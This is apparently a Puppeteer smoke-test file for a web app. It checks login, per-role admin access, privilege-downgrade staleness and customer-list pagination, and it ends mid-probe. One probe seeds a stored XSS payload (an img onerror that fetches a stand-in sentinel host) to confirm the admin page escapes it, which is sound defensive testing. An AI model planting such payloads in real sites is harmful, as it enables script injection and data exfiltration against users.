// Headless browser smoke test for /login → / → /admin per role.
// Captures screenshots into test-results/screenshots/ and asserts that:
//   - unauth /admin redirects to /login
//   - viewer/member/manager see the access-denied page on /admin
//   - admin loads /admin successfully without console errors
//   - login form actually works end-to-end (cookie set, redirect to /)
const fs = require('fs');
const path = require('path');
let puppeteer = null;
try { puppeteer = require('puppeteer'); } catch { /* optional */ }

const { BASE, PASSWORD, ROLES, login } = require('./harness');
const { Pool } = require('pg');

function parseCookieKV(jar) {
  // jar is like "connect.sid=s%3A..." (already trimmed by parseSetCookie)
  if (!jar) return null;
  const idx = jar.indexOf('=');
  if (idx < 0) return null;
  return { name: jar.slice(0, idx), value: jar.slice(idx + 1) };
}

const SCREENSHOT_DIR = path.resolve(__dirname, '..', '..', 'test-results', 'screenshots');

async function safeShot(page, file) {
  try {
    await page.screenshot({ path: file, fullPage: true });
  } catch {
    try { await page.screenshot({ path: file }); } catch { /* swallow */ }
  }
}

async function runUiSmoke({ users, runId, clients }) {
  const findings = [];
  function record(name, expected, observed, severity, ok, detail) {
    findings.push({ category: 'ui-smoke', name, expected, observed, severity, ok, detail: detail || '' });
  }

  if (!puppeteer) {
    record('puppeteer available', 'require("puppeteer") resolves',
      'module not installed — npm i -D puppeteer', 'high', false,
      'Install puppeteer and rerun, or pin a system chromium via PUPPETEER_EXECUTABLE_PATH.');
    return findings;
  }
  fs.mkdirSync(SCREENSHOT_DIR, { recursive: true });

  let browser;
  try {
    // Prefer the system chromium (installed via Nix) over puppeteer's bundled
    // download — the latter is missing libglib in this NixOS environment.
    const { findChromium } = require('../shared/find-chromium');
    const executablePath = findChromium() || undefined;
    browser = await puppeteer.launch({
      headless: true,
      executablePath,
      defaultViewport: { width: 1280, height: 800 },
      args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage',
        '--window-size=1280,800'],
    });
  } catch (e) {
    record('headless chromium launches', 'browser.launch() succeeds',
      `error: ${e.message}`, 'high', false,
      'Re-run after `npx puppeteer browsers install chrome` if Chromium is missing.');
    return findings;
  }

  try {
    // Unauth: /admin should bounce to /login
    {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const resp = await page.goto(`${BASE}/admin`, { waitUntil: 'domcontentloaded' });
      const finalUrl = page.url();
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-unauth-admin.png`));
      const bouncedToLogin = /\/login(\?|$)/.test(finalUrl) || (resp && resp.status() === 302);
      record('unauth /admin bounces to /login',
        '/login redirect (or 302)', `url=${finalUrl} status=${resp?.status()}`,
        'critical', bouncedToLogin);
      await page.close();
    }

    for (const role of ROLES) {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const consoleErrors = [];
      // Turnstile widget errors are an environmental condition of the harness
      // (TURNSTILE_SECRET_KEY is stripped → /api/turnstile-config returns
      // `{ sitekey: null }`, the widget rejects the non-string), not a
      // privilege regression. Drop them from the budget.
      // Filter out environmental noise that doesn't represent a privilege
      // regression: Turnstile widget errors (TURNSTILE_SECRET_KEY stripped by
      // harness), HubSpot/QB 503s (tokens stripped), and the SPA's expected
      // 401/403 responses on /api/admin/* for non-admin roles (the JS
      // *intentionally* tries each admin endpoint and rerenders on denial).
      const ignore = (s) => /Turnstile|turnstile-config|cloudflare|challenges\.cloudflare\.com|status of (401|403|503)|Failed to load resource|HUBSPOT_ACCESS_TOKEN|HUBSPOT_TOKEN|QuickBooks|QB_|Bootstrap failed/i.test(s);
      page.on('console', m => { if (m.type() === 'error' && !ignore(m.text())) consoleErrors.push(m.text()); });
      page.on('pageerror', e => { if (!ignore(e.message)) consoleErrors.push(`pageerror: ${e.message}`); });

      // 1) /login form renders
      await page.goto(`${BASE}/login`, { waitUntil: 'domcontentloaded' });
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-${role}-login.png`));

      // Sign in via a Node-side fetch (harness's makeClient) and inject the
      // resulting session cookie into puppeteer. This sidesteps puppeteer's
      // page-context fetch dropping the Set-Cookie under certain
      // origin/SameSite combinations, while still exercising /api/login.
      const sess = await login(users[role].email, PASSWORD);
      const kv = parseCookieKV(sess.cookie);
      record(`${role} can sign in via /api/login (server-side jar)`,
        'session cookie set', `cookieSet=${!!kv}`,
        'critical', !!kv);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      // 2) Land on /
      await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-${role}-home.png`));

      // 3) Visit /admin
      const adminResp = await page.goto(`${BASE}/admin`, { waitUntil: 'domcontentloaded' });
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-${role}-admin.png`));
      const adminStatus = adminResp ? adminResp.status() : 0;
      const bodyText = await page.evaluate(() => document.body?.innerText || '');

      // /admin is server-side gated: non-admins get 403, admin gets 200.
      if (role === 'admin') {
        record(`admin /admin returns 200 in the browser`,
          'status=200', `status=${adminStatus}`,
          'critical', adminStatus === 200);
        // The h1 "Admin Panel" exists in static markup; verify via outerHTML
        // (innerText can be empty if the page redirected or set display:none
        // on the body during JS init).
        const finalUrl = page.url();
        const html = await page.content();
        const hasHeading = /Admin Panel/i.test(html);
        record('admin sees the Admin Panel HTML after navigation',
          'page HTML contains "Admin Panel" and URL is /admin',
          `url=${finalUrl} hasHeading=${hasHeading}`,
          'high', hasHeading && /\/admin(\?|#|$)/.test(finalUrl));

        // ── Shared chrome assertions ─────────────────────────────────────────
        // The top app bar is now a React MUI island
        // (src/react/components/GlobalHeader.tsx) mounted into
        // #app-header-mount by /react/main.js. Wait briefly for the React
        // bundle to mount before inspecting.
        await page.waitForFunction(
          () => !!document.querySelector('#app-header-mount header.MuiAppBar-root'),
          { timeout: 5000 },
        ).catch(() => {});
        const chromeInfo = await page.evaluate(() => {
          const mount = document.querySelector('#app-header-mount');
          const muiHeader = mount?.querySelector('header.MuiAppBar-root');
          const titleEl = muiHeader?.querySelector('.MuiToolbar-root .MuiTypography-root');
          const legacySignOut = Array.from(document.querySelectorAll('.nav-btn'))
            .find(el => /sign\s*out/i.test(el.textContent));
          const avatarLink = muiHeader?.querySelector('a[href="/profile"]');
          return {
            hasAppHeader: !!muiHeader,
            pageTitleText: titleEl ? titleEl.textContent.trim() : '',
            hasLegacySignOut: !!legacySignOut,
            hasAuthAvatar: !!avatarLink,
          };
        });

        record('admin /admin renders the MUI GlobalHeader island',
          '#app-header-mount header.MuiAppBar-root element present in DOM',
          `hasAppHeader=${chromeInfo.hasAppHeader}`,
          'high', chromeInfo.hasAppHeader);

        record('admin /admin GlobalHeader page title contains "Admin"',
          'header title text includes "Admin"',
          `pageTitleText="${chromeInfo.pageTitleText}"`,
          'high', /Admin/i.test(chromeInfo.pageTitleText));

        record('admin /admin has no legacy bespoke "Sign out" nav-btn',
          'no .nav-btn element with "Sign out" text',
          `hasLegacySignOut=${chromeInfo.hasLegacySignOut}`,
          'medium', !chromeInfo.hasLegacySignOut);

        record('admin /admin renders the profile avatar link in the MUI header',
          '#app-header-mount a[href="/profile"] element present in DOM',
          `hasAuthAvatar=${chromeInfo.hasAuthAvatar}`,
          'high', chromeInfo.hasAuthAvatar);
      } else {
        record(`${role} /admin returns 403 in the browser`,
          'status=403', `status=${adminStatus}`,
          'critical', adminStatus === 403);
      }

      // 4) Console error budget: zero unexpected errors per role
      record(`${role} loads /admin without browser console errors`,
        'consoleErrors.length === 0',
        `count=${consoleErrors.length} sample=${JSON.stringify(consoleErrors.slice(0, 3))}`,
        'medium', consoleErrors.length === 0);

      await page.close();
    }
    // ── XSS render non-execution (admin UI) ────────────────────────────────
    // Seed a stored XSS payload through the public access-request endpoint,
    // log in as admin in puppeteer, navigate to /admin, and assert:
    //   (a) no pageerror or attacker-controlled fetch fires
    //   (b) the payload is NOT present in any element's outerHTML as raw
    //       script tags (only as HTML-escaped text inside text nodes)
    // The harness covers data round-trip via probes.js; this probe verifies
    // the rendered DOM does not execute the payload.
    try {
      const pool = new Pool({
        connectionString: process.env.DATABASE_URL_TEST || process.env.DATABASE_URL,
      });
      const xssEmail = `privtest-uixss-${runId}@privtest.local`;
      const sentinelHost = `xss-sentinel-${runId}.invalid`;
      const xssPayload = `"><img src=x onerror="window.__xssFired=1;fetch('https://${sentinelHost}/?n=${runId}')">`;
      await pool.query(
        `INSERT INTO account_requests (name, email, status, created_at)
         VALUES ($1, $2, 'pending', NOW())`, [xssPayload, xssEmail]);

      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const errs = [];
      const evilHits = [];
      page.on('pageerror', e => errs.push(e.message));
      page.on('request', req => {
        if (req.url().includes(sentinelHost)) evilHits.push(req.url());
      });

      const sess = await login(users.admin.email, PASSWORD);
      const kv = parseCookieKV(sess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value, domain: hostname,
          path: '/', httpOnly: true,
        });
      }
      await page.goto(`${BASE}/admin`, { waitUntil: 'networkidle2', timeout: 15000 }).catch(() => {});
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-xss-render.png`));
      const xssFired = await page.evaluate(() => !!window.__xssFired);
      const html = await page.content();
      // The payload must NOT appear as a raw <img onerror=…> tag in the DOM
      // — only as a text-encoded string inside a cell.
      const rawTagPresent = /<img\s+src=x\s+onerror=/i.test(html);

      record('admin /admin renders the stored XSS payload as text, not script',
        'no pageerror, no fetch to sentinel host, no raw <img onerror> in DOM',
        `pageerrors=${errs.length} sentinelHits=${evilHits.length} xssFired=${xssFired} rawTag=${rawTagPresent}`,
        'critical',
        errs.length === 0 && evilHits.length === 0 && !xssFired && !rawTagPresent);
      await page.close();
      await pool.query(`DELETE FROM account_requests WHERE email = $1`, [xssEmail]);
      await pool.end();
    } catch (e) {
      record('XSS render non-execution probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Privilege downgrade UI staleness (Puppeteer, from already-open page) ─
    // Open /admin as the manager, then have admin demote them to viewer via a
    // separate session, then trigger an admin-only API call from the manager's
    // already-loaded page. The fetch must return 401/403 — proving the gate
    // re-reads role on every request rather than trusting the page's stale
    // session cookie. This is the UI-level analogue of the API downgrade
    // probe in probes.js.
    try {
      const pool = new Pool({
        connectionString: process.env.DATABASE_URL_TEST || process.env.DATABASE_URL,
      });
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);
      const mgrSess = await login(users.manager.email, PASSWORD);
      const kv = parseCookieKV(mgrSess.cookie);
      const { hostname } = new URL(BASE);
      if (kv) {
        await page.setCookie({
          name: kv.name, value: kv.value, domain: hostname,
          path: '/', httpOnly: true,
        });
      }
      // Manager hits a manager-only API to confirm baseline access.
      await page.goto(`${BASE}/`, { waitUntil: 'domcontentloaded' });
      const before = await page.evaluate(async (base) => {
        const r = await fetch(`${base}/api/trades`, { credentials: 'include' });
        return r.status;
      }, BASE);

      // Now demote via the admin's session (out-of-band).
      const adminSess = await login(users.admin.email, PASSWORD);
      await adminSess.patch(`/api/users/${users.manager.id}/profile`,
        { privilege_level: 'viewer' });

      // From the *same* already-loaded page, fire the same API call again.
      const after = await page.evaluate(async (base) => {
        const r = await fetch(`${base}/api/trades`, { credentials: 'include' });
        return r.status;
      }, BASE);
      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-downgrade-ui.png`));

      record('demoted manager loses access from an already-open page (UI staleness)',
        'before=200 (manager) → after in {401,403} (viewer)',
        `before=${before} after=${after}`,
        'critical', before === 200 && (after === 401 || after === 403));

      // Restore the manager
      await adminSess.patch(`/api/users/${users.manager.id}/profile`,
        { privilege_level: 'manager' });
      await page.close();
      await pool.end();
    } catch (e) {
      record('privilege downgrade UI staleness probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Customer list pagination UI smoke ──────────────────────────────────
    // Intercept /api/contacts-all at the Puppeteer level and return 26
    // synthetic contacts (one more than PAGE_SIZE=25) so we can:
    //   (a) verify the pagination bar renders when contacts > 25
    //   (b) click Next to reach page 2
    //   (c) click a contact card → /customers/:id
    //   (d) navigate back to /customers and confirm sessionStorage restored page 2
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);

      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      const syntheticContacts = Array.from({ length: 26 }, (_, i) => ({
        id: `pag-test-${i + 1}`,
        properties: {
          firstname: 'Page',
          lastname: `Test${String(i + 1).padStart(2, '0')}`,
          email: `pagtest${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `PT-${String(i + 1).padStart(2, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const mockPayload  = JSON.stringify({ results: syntheticContacts, total: 26, page: 1, totalPages: 2 });
      const emptyPayload = JSON.stringify({ results: [], total: 0, page: 1, totalPages: 1 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: mockPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      // (a) pagination bar appears when contacts > 25
      const paginationEl = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);
      record('pagination bar appears when contacts > 25',
        '.cl-pagination element visible in DOM',
        `found=${!!paginationEl}`,
        'medium', !!paginationEl);

      let page2InfoText = '';
      let onDetailPage = false;
      let restoredInfoText = '';

      if (paginationEl) {
        const infoText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
        record('pagination info shows correct total on page 1',
          'text contains "of 26"',
          `text="${infoText}"`,
          'medium', infoText.includes('of 26'));

        // (b) click Next → page 2 (the 26th contact)
        await page.click('#cl-next-btn');
        await page.waitForFunction(() => {
          const info = document.querySelector('.cl-pagination-info');
          return info && info.textContent.includes('26');
        }, { timeout: 5000 }).catch(() => {});

        page2InfoText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
        record('pagination advances to page 2 on Next click',
          'info text contains "Showing 26" (the 26th item)',
          `text="${page2InfoText}"`,
          'medium', /Showing 26/.test(page2InfoText));

        // (c) click the contact card on page 2 — goToCustomer saves sessionStorage
        //     and navigates to /customers/:id
        const contactCard = await page.$('[data-contact-id]');
        if (contactCard) {
          await Promise.all([
            page.waitForNavigation({ waitUntil: 'domcontentloaded', timeout: 8000 }),
            contactCard.click(),
          ]).catch(() => {});

          const detailUrl = page.url();
          onDetailPage = /\/customers\//.test(detailUrl);
          record('clicking a contact on page 2 navigates to /customers/:id',
            'url matches /customers/<id>',
            `url=${detailUrl}`,
            'medium', onDetailPage);

          // (d) navigate back to the list — restoreCustomerListFilters() should
          //     re-apply currentPage=2 from sessionStorage
          await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });
          await page.waitForFunction(() => {
            const info = document.querySelector('.cl-pagination-info');
            return info && info.textContent.includes('26');
          }, { timeout: 8000 }).catch(() => {});

          restoredInfoText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
          record('returning to /customers restores page 2 from sessionStorage',
            'pagination info still shows "Showing 26" after back-navigation',
            `text="${restoredInfoText}"`,
            'medium', /Showing 26/.test(restoredInfoText));
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-pagination-smoke.png`));
      await page.close();
    } catch (e) {
      record('customer list pagination smoke probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Filter-reset pagination regression ─────────────────────────────────
    // Regression guard: applying a filter while on page 2 must reset
    // currentPage to 1.  If that reset is accidentally removed the list
    // renders an empty page 2 while contacts exist on page 1.
    // Steps:
    //   1. Load /customers with a 26-contact mock → pagination bar appears.
    //   2. Click Next → advance to page 2 ("Showing 26–26 of 26").
    //   3. Apply a filter (click a stage tab) → currentPage must reset to 1.
    //   4. Assert pagination info shows "Showing 1–" (not an empty page 2).
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 1280, height: 800 });
      await page.setCacheEnabled(false);

      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      const syntheticContacts = Array.from({ length: 26 }, (_, i) => ({
        id: `freset-${i + 1}`,
        properties: {
          firstname: 'Reset',
          lastname: `Test${String(i + 1).padStart(2, '0')}`,
          email: `freset${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `FR-${String(i + 1).padStart(2, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const mockPayload  = JSON.stringify({ results: syntheticContacts, total: 26, page: 1, totalPages: 2 });
      const emptyPayload = JSON.stringify({ results: [], total: 0, page: 1, totalPages: 1 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: mockPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      const paginationEl2 = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);

      let onPage2Text = '';
      let afterFilterText = '';
      let filterApplied = false;

      if (paginationEl2) {
        // Step 2: advance to page 2
        await page.click('#cl-next-btn');
        await page.waitForFunction(() => {
          const info = document.querySelector('.cl-pagination-info');
          return info && info.textContent.includes('26');
        }, { timeout: 5000 }).catch(() => {});
        onPage2Text = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');

        // Step 3: apply a filter that keeps contacts-all as the data source so
        // the list remains non-empty after the reset and we can assert page 1.
        // - "[data-tab-key='__all__']" always calls loadContactsPage (mocked →
        //   26 contacts) and sets currentPage=1.
        // - "#archived-toggle" (showArchived false→true) also calls
        //   loadContactsPage and sets currentPage=1 — used as a fallback.
        // Avoid "[data-tab-key='__active__']" / any tab that triggers
        // open-leads (mocked empty), which removes pagination entirely.
        const allTab = await page.$('[data-tab-key="__all__"]');
        if (allTab) {
          await allTab.click();
          filterApplied = true;
        } else {
          const archivedBtn = await page.$('#archived-toggle');
          if (archivedBtn) {
            await archivedBtn.click();
            filterApplied = true;
          }
        }

        if (filterApplied) {
          // Step 4: wait for re-render and assert page 1
          // After the reset, 26 contacts are still loaded, so info should
          // read "Showing 1–25 of 26".
          await page.waitForFunction(() => {
            const info = document.querySelector('.cl-pagination-info');
            return info && /Showing 1[–\-]/.test(info.textContent);
          }, { timeout: 8000 }).catch(() => {});
          afterFilterText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-filter-reset-pagination.png`));

      record('filter applied on page 2 resets customer list to page 1',
        'pagination info shows "Showing 1–25 of 26" after filter change from page 2',
        `onPage2="${onPage2Text}" afterFilter="${afterFilterText}" filterApplied=${filterApplied}`,
        'medium',
        /Showing 26/.test(onPage2Text) && /Showing 1[–\-]25/.test(afterFilterText));

      // ── Lead-status filter reset sub-probe ───────────────────────────────────
      // Advance back to page 2, then change the lead-status dropdown.
      // setLeadStatusFilter resets currentPage to 1; verify the info text shows
      // "Showing 1–" (not an empty page 2).
      let leadFilterOnPage2Text = '';
      let afterLeadFilterText = '';
      let leadFilterApplied = false;
      let leadStatusProbeErr = null;

      try {
        if (paginationEl2) {
          // Return to page 1 first (in case we're not there after the stage-tab reset)
          // then advance to page 2 so we have a clean starting point.
          await page.evaluate(() => {
            const prev = document.querySelector('#cl-prev-btn');
            if (prev) prev.click();
          }).catch(() => {});

          // Advance to page 2
          await page.click('#cl-next-btn').catch(() => {});
          await page.waitForFunction(() => {
            const info = document.querySelector('.cl-pagination-info');
            return info && info.textContent.includes('26');
          }, { timeout: 5000 }).catch(() => {});
          leadFilterOnPage2Text = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');

          // Change the lead-status select to a value different from the current one.
          // Critical: choose an enabled (count > 0) option so the filtered list
          // stays non-empty and pagination remains visible for the assertion.
          //
          // With the 26-contact mock (all hs_lead_status='OPEN_DEAL'):
          //   - '' (All statuses)  → 26 contacts, enabled  ← starting value
          //   - 'OPEN_DEAL'        → 26 contacts, enabled  ← target
          //   - '__no_status__'    →  0 contacts, disabled ← must be skipped
          //
          // We pick the first enabled option with a non-empty value (i.e. not
          // "All statuses"), falling back to injecting a synthetic 'OPEN_DEAL'
          // option if the select has no enabled specific-status options.
          const changed = await page.evaluate(() => {
            const sel = document.querySelector('#lead-status-filter');
            if (!sel) return false;

            // Find first enabled option that isn't "All statuses" (value '').
            const opts = Array.from(sel.options);
            const target = opts.find(o => o.value !== '' && !o.disabled);
            if (target) {
              sel.value = target.value;
            } else {
              // Fallback: inject a synthetic OPEN_DEAL option that matches all
              // mock contacts so the list stays non-empty after the filter change.
              const opt = document.createElement('option');
              opt.value = 'OPEN_DEAL';
              opt.textContent = 'Open Deal (synthetic)';
              sel.appendChild(opt);
              sel.value = 'OPEN_DEAL';
            }
            // Fire the change event — triggers setLeadStatusFilter() which resets
            // state.currentPage to 1 and calls renderCustomerList().
            sel.dispatchEvent(new Event('change', { bubbles: true }));
            return true;
          }).catch(() => false);

          if (changed) {
            leadFilterApplied = true;
            await page.waitForFunction(() => {
              const info = document.querySelector('.cl-pagination-info');
              return info && /Showing 1[–\-]/.test(info.textContent);
            }, { timeout: 8000 }).catch(() => {});
            afterLeadFilterText = await page.$eval('.cl-pagination-info', el => el.textContent).catch(() => '');
          }
        }
      } catch (e) {
        leadStatusProbeErr = e;
      } finally {
        await safeShot(page, path.join(SCREENSHOT_DIR,
          leadStatusProbeErr
            ? `${runId}-lead-status-filter-reset-error.png`
            : `${runId}-lead-status-filter-reset.png`));
      }

      record('lead-status filter change on page 2 resets customer list to page 1',
        'pagination info shows "Showing 1–" after lead-status dropdown change from page 2',
        `onPage2="${leadFilterOnPage2Text}" afterFilter="${afterLeadFilterText}" filterApplied=${leadFilterApplied}`,
        'medium',
        !leadStatusProbeErr && /Showing 26/.test(leadFilterOnPage2Text) && /Showing 1[–\-]/.test(afterLeadFilterText));

      await page.close();
    } catch (e) {
      record('filter-reset pagination regression probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Mobile pagination overflow regression ───────────────────────────────
    // Regression guard: the pagination bar must not overflow its container at
    // 360 px viewport width (responsive rules added in task #429).
    // Steps:
    //   1. Open /customers at 360 px viewport with a 26-contact mock so the
    //      pagination bar is rendered.
    //   2. Assert scrollWidth <= clientWidth on .cl-pagination (no overflow).
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 360, height: 640 });
      await page.setCacheEnabled(false);

      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      const syntheticContacts = Array.from({ length: 26 }, (_, i) => ({
        id: `mobile-pg-${i + 1}`,
        properties: {
          firstname: 'Mobile',
          lastname: `Page${String(i + 1).padStart(2, '0')}`,
          email: `mobilepg${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `MP-${String(i + 1).padStart(2, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const mockPayload  = JSON.stringify({ results: syntheticContacts, total: 26, page: 1, totalPages: 2 });
      const emptyPayload = JSON.stringify({ results: [], total: 0, page: 1, totalPages: 1 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: mockPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      const paginationElMobile = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);

      let noOverflow = false;
      let overflowDetail = 'pagination bar not found';

      if (paginationElMobile) {
        const dims = await page.$eval('.cl-pagination', el => ({
          scrollWidth: el.scrollWidth,
          clientWidth: el.clientWidth,
        })).catch(() => null);

        if (dims) {
          noOverflow = dims.scrollWidth <= dims.clientWidth;
          overflowDetail = `scrollWidth=${dims.scrollWidth} clientWidth=${dims.clientWidth}`;
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-mobile-pagination-overflow.png`));

      record('pagination bar does not overflow at 360 px viewport width',
        'scrollWidth <= clientWidth on .cl-pagination at 360 px',
        overflowDetail,
        'medium', noOverflow);

      await page.close();
    } catch (e) {
      record('mobile pagination overflow regression probe ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }
    // ── Mobile pagination overflow — many pages (high page-number variant) ──
    // A customer list with hundreds of pages exercises wider page-number buttons
    // and multi-digit numbers.  This variant uses 201 contacts (9 pages) and
    // navigates to page 8 so the paginator renders numbers like "6 7 [8] 9"
    // alongside "…" ellipsis elements.  The bar must still not overflow at
    // 360 px viewport width.
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 360, height: 640 });
      await page.setCacheEnabled(false);

      const memberSess = await login(users.member.email, PASSWORD);
      const kv = parseCookieKV(memberSess.cookie);
      if (kv) {
        const { hostname } = new URL(BASE);
        await page.setCookie({
          name: kv.name, value: kv.value,
          domain: hostname, path: '/', httpOnly: true,
        });
      }

      // 201 contacts → 9 pages of 25.  Navigate to page 8 to trigger the
      // "many-page" number display (ellipsis on both sides).
      const manyContacts = Array.from({ length: 201 }, (_, i) => ({
        id: `many-pg-${i + 1}`,
        properties: {
          firstname: 'Many',
          lastname: `Page${String(i + 1).padStart(3, '0')}`,
          email: `manypg${i + 1}@privtest.local`,
          phone: '',
          hs_lead_status: 'OPEN_DEAL',
          city: '',
          customer_number: `MN-${String(i + 1).padStart(3, '0')}`,
          createdate: new Date(Date.now() - i * 1000).toISOString(),
          closedate: null,
          lastmodifieddate: new Date().toISOString(),
        },
        createdAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
        archived: false,
      }));
      const manyPayload  = JSON.stringify({ results: manyContacts, total: 201, page: 1, totalPages: 9 });
      const emptyPayload = JSON.stringify({ results: [], total: 0, page: 1, totalPages: 1 });

      await page.setRequestInterception(true);
      page.on('request', req => {
        const u = req.url();
        if (u.includes('/api/contacts-all')) {
          req.respond({ status: 200, contentType: 'application/json', body: manyPayload });
        } else if (u.includes('/api/open-leads')) {
          req.respond({ status: 200, contentType: 'application/json', body: emptyPayload });
        } else {
          req.continue();
        }
      });

      await page.goto(`${BASE}/customers`, { waitUntil: 'domcontentloaded' });

      const paginationElMany = await page.waitForSelector('.cl-pagination', { timeout: 8000 }).catch(() => null);

      let noOverflowMany = false;
      let overflowDetailMany = 'pagination bar not found';

      if (paginationElMany) {
        // Jump to page 8 via the jump form so multi-digit page numbers render.
        await page.evaluate(() => {
          const input = document.querySelector('#cl-jump-input');
          const form  = document.querySelector('#cl-jump-form');
          if (input && form) {
            input.value = '8';
            form.dispatchEvent(new Event('submit', { bubbles: true, cancelable: true }));
          }
        }).catch(() => {});

        // Wait for the pagination info to reflect page 8 content
        // (items 176–200 of 201).
        await page.waitForFunction(() => {
          const info = document.querySelector('.cl-pagination-info');
          return info && /176|177|178/.test(info.textContent);
        }, { timeout: 5000 }).catch(() => {});

        const dims = await page.$eval('.cl-pagination', el => ({
          scrollWidth: el.scrollWidth,
          clientWidth: el.clientWidth,
        })).catch(() => null);

        if (dims) {
          noOverflowMany = dims.scrollWidth <= dims.clientWidth;
          overflowDetailMany = `scrollWidth=${dims.scrollWidth} clientWidth=${dims.clientWidth}`;
        }
      }

      await safeShot(page, path.join(SCREENSHOT_DIR, `${runId}-mobile-pagination-overflow-many.png`));

      record('pagination bar does not overflow at 360 px with 9 pages (high page-number variant)',
        'scrollWidth <= clientWidth on .cl-pagination at 360 px with 201 contacts on page 8',
        overflowDetailMany,
        'medium', noOverflowMany);

      await page.close();
    } catch (e) {
      record('mobile pagination overflow regression probe (many-pages variant) ran', 'no error',
        `error: ${e.message}`, 'medium', false);
    }

    // ── Tablet pagination overflow — 540 px breakpoint (many pages) ──────────
    // The responsive CSS hides .cl-pagination-page and .cl-pagination-ellipsis
    // at max-width: 540 px.  This probe confirms that the intermediate breakpoint
    // rules also prevent overflow when the page-number buttons are hidden.
    // Uses 201 contacts (9 pages) and navigates to page 8.
    try {
      const page = await browser.newPage();
      await page.setViewport({ width: 540, height: 900 });
      await page.setCacheEnabled(false);
